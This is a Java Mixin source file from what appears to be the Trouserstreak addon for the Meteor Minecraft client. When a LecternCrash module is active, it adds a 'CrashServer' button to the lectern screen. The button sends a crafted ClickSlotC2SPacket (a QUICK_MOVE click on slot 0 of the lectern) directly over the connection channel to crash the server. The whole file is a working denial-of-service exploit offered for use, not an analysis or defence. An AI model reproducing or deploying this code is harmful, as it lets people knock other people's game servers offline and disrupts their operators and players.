package pwn.noobs.trouserstreak.mixin;

import com.google.common.collect.Lists;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.systems.modules.Modules;
import net.minecraft.screen.sync.ComponentChangesHash;
import net.minecraft.screen.sync.ItemStackHash;
import pwn.noobs.trouserstreak.mixin.accessor.ClientConnectionAccessor;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.Slot;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import net.minecraft.util.collection.DefaultedList;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import pwn.noobs.trouserstreak.modules.LecternCrash;

import java.util.List;

@Mixin(LecternScreen.class)
public class LecternScreenMixin extends Screen {
    protected LecternScreenMixin(Text title) {
        super(title);
    }

    @Inject(at = @At("TAIL"), method = "init")
    public void init(CallbackInfo ci) {
        if(Modules.get().isActive(LecternCrash.class)){
        this.addDrawableChild(new ButtonWidget.Builder(Text.of("CrashServer"), (button) -> {
            ScreenHandler screenHandler = client.player.currentScreenHandler;
            DefaultedList<Slot> defaultedList = screenHandler.slots;
            int i = defaultedList.size();
            List<ItemStack> list = Lists.newArrayListWithCapacity(i);

            for (Slot slot : defaultedList) {
                list.add(slot.getStack().copy());
            }

            Int2ObjectMap<ItemStackHash> int2ObjectMap = new Int2ObjectOpenHashMap<>();
            ComponentChangesHash.ComponentHasher hasher = client.getNetworkHandler().componentHasher;

            for(int slot = 0; slot < i; ++slot) {
                ItemStack itemStack = list.get(slot);
                ItemStack itemStack2 = (defaultedList.get(slot)).getStack();
                ItemStackHash hash = ItemStackHash.fromItemStack(itemStack2, hasher);
                if (!ItemStack.areEqual(itemStack, itemStack2)) {
                    int2ObjectMap.put(slot, hash);
                }
            }
            ItemStackHash hash = ItemStackHash.fromItemStack(client.player.currentScreenHandler.getCursorStack(), hasher);
            ((ClientConnectionAccessor) client.getNetworkHandler().getConnection()).getChannel().writeAndFlush(new ClickSlotC2SPacket(client.player.currentScreenHandler.syncId, client.player.currentScreenHandler.getRevision(), (short) 0, (byte) 0, SlotActionType.QUICK_MOVE, int2ObjectMap, hash));
            client.player.sendMessage(Text.of("Crashing Server..."), false);
            button.active = false;
        })
                        .position(5, 25)
                        .size(100, 20)
                        .build()
        );
        }
    }
}
